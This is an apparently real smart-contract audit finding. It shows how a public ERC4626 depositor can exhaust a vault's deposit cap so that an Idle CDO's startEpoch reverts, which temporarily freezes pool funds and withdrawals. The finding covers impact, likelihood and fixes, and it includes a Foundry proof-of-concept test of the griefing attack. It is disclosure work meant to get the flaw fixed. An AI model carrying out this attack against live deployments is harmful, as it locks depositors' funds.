### Title
Unprivileged ERC4626 depositors can block programmable-borrower epoch starts - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` unconditionally deposits all idle underlying into a public ERC4626 vault when an epoch starts. An unprivileged depositor can consume the vault’s remaining deposit capacity, causing `vault.deposit()` and the CDO’s entire `startEpoch()` transaction to revert. While the attacker keeps the cap saturated, the credit vault cannot leave the buffer phase and withdrawal receipts cannot mature.

### Finding Description
At epoch start, `ProgrammableBorrower.onStartEpoch()` snapshots its current ERC4626 position, then calls `_depositToVault()` with its full idle underlying balance. [1](#0-0) 

`_depositToVault()` invokes `vault.deposit()` without checking `maxDeposit()` and without an alternative path for capacity-constrained vaults. [2](#0-1) 

The selected vault is an external public ERC4626 stored during initialization; users do not need any Idle role to deposit into it. [3](#0-2) 

`IdleCDOEpochVariant.startEpoch()` transfers the pool’s funds to the programmable borrower and then invokes the programmable-borrower start hook in the same transaction. [4](#0-3) 

Therefore, if a public ERC4626 depositor fills the remaining `maxDeposit()` capacity before `startEpoch()`, `vault.deposit()` reverts and atomically rolls back the borrower transfer, epoch activation, and related state changes. [4](#0-3) 

The same unchecked external-vault dependency exists in reverse at stop time: if the caller’s required cash exceeds on-hand funds, `onStopEpoch()` calls `vault.withdraw()` and converts an ERC4626 withdrawal failure into a reverting epoch transition. [5](#0-4) 

### Impact Explanation
This causes temporary freezing of pool funds rather than direct theft. Before `startEpoch()`, user deposits are held by `IdleCreditVault`, which pulls the underlying and mints one strategy token per underlying to the CDO. [6](#0-5) 

If the programmable-borrower vault deposit reverts, the entire start transaction reverts, so those funds remain stranded in the strategy and `isEpochRunning` remains false. [7](#0-6) 

For a recurring pool, normal withdrawal receipts only become claimable after `epochNumber` advances beyond their request epoch; `epochNumber` advances only through the strategy’s stop-time `deposit()` path. [8](#0-7) [9](#0-8) 

The frozen amount is the full idle pool balance passed to the borrower, plus any pending withdrawals that depend on a subsequent epoch transition. The attacker can prolong the freeze by retaining the external vault deposit and ends it by withdrawing enough shares to reopen capacity.

### Likelihood Explanation
Any public depositor in the configured ERC4626 vault can perform this attack; no borrower, manager, owner, or other privileged Idle role is required. [10](#0-9) 

The cost is bounded by the vault’s remaining deposit capacity. When the vault is already close to its cap, the attacker needs only that residual amount, and they retain ownership of the external vault shares rather than losing the principal.

The issue is particularly relevant to cap-constrained ERC4626 vaults. Liquidity exhaustion creates a second trigger at epoch stop because an external withdrawal failure makes `onStopEpoch()` revert instead of leaving the funds idle and countable. [11](#0-10) 

### Recommendation
Do not make epoch progression depend on an uncapped or fully liquid external ERC4626 position. In `onStartEpoch()`, cap the deposit at `vault.maxDeposit(address(this))` and leave any remainder on the programmable borrower; update `_vaultNetInterest()` to include idle underlying in `earnedAssets` so the residual cash is not misclassified as vault loss. [12](#0-11) 

Reserve `epochPendingWithdraws` on hand rather than redeploying funds required for the next stop, and preflight `maxWithdraw()` or `maxRedeem()` before recalling liquidity. [13](#0-12) 

### Proof of Concept
The following test extends the existing programmable-borrower fork fixture where `cdoEpoch`, `idleCDO`, `programmableBorrower`, `morphoVault`, `strategy`, `owner`, `manager`, and `defaultUnderlying` are already initialized:

```solidity
function test_PublicVaultDepositorBlocksEpochStart() external {
    address attacker = makeAddr("erc4626Depositor");
    uint256 poolAmount = 10_000 * oneScale;

    // Programmable mode requires minted-interest accounting.
    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(poolAmount);

    // An unprivileged ERC4626 depositor consumes all remaining deposit capacity.
    uint256 headroom = morphoVault.maxDeposit(address(programmableBorrower));
    require(headroom > 0 && headroom < type(uint256).max, "fixture requires finite vault cap");

    deal(defaultUnderlying, attacker, headroom);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(morphoVault), headroom);
    morphoVault.deposit(headroom, attacker);
    vm.stopPrank();

    assertEq(
        morphoVault.maxDeposit(address(programmableBorrower)),
        0,
        "attacker did not exhaust the public vault cap"
    );

    uint256 strategyCashBefore =
        IERC20Detailed(defaultUnderlying).balanceOf(address(strategy));

    // ProgrammableBorrower.onStartEpoch -> _depositToVault -> vault.deposit reverts,
    // so the whole startEpoch transition reverts.
    vm.prank(manager);
    vm.expectRevert();
    cdoEpoch.startEpoch();

    assertFalse(cdoEpoch.isEpochRunning(), "epoch unexpectedly started");
    assertEq(
        IERC20Detailed(defaultUnderlying).balanceOf(address(strategy)),
        strategyCashBefore,
        "pool funds moved despite failed start"
    );

    // The freeze is temporary and ends when the attacker withdraws and reopens capacity.
    uint256 attackerShares = morphoVault.balanceOf(attacker);
    vm.prank(attacker);
    morphoVault.redeem(attackerShares, attacker, attacker);

    vm.prank(manager);
    cdoEpoch.startEpoch();

    assertTrue(cdoEpoch.isEpochRunning(), "epoch did not resume after cap reopened");
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L38-45)
```text
  IERC4626 public vault;
  /// @notice IdleCDOEpochVariant address allowed to pull funds
  address public idleCDO;
  /// @notice real borrower address allowed to draw/repay
  address public borrower;

  /// @notice fixed APR charged to borrower debt (100e18 = 100% APR)
  uint256 public borrowerApr;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L125-134)
```text
    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L204-216)
```text
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L339-341)
```text
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/IdleCDOEpochVariant.sol (L241-248)
```text
    // Remove raw donated underlyings before calculating epoch interest or borrower transfer amounts.
    _skimDonatedAssets();

    isEpochRunning = true;
    // prevent deposits
    _pause();

    // prevent withdrawals requests
```

**File:** contracts/IdleCDOEpochVariant.sol (L293-298)
```text
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L320-327)
```text
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L596-604)
```text
  function deposit(uint256 _amount)
    external
    virtual
    override
    returns (uint256) {
    _onlyIdleCDO();
    if (_amount > 0) {
      underlyingToken.safeTransferFrom(msg.sender, address(this), _amount);
      _mint(msg.sender, _amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L607-611)
```text
    if (IIdleCDOEpochVariant(idleCDO).isEpochRunning()) {
      // deposit done on stopEpoch (before setting the var to false) so we reset the counter
      totEpochDeposits = 0;
      epochNumber += 1;
    } else {
```
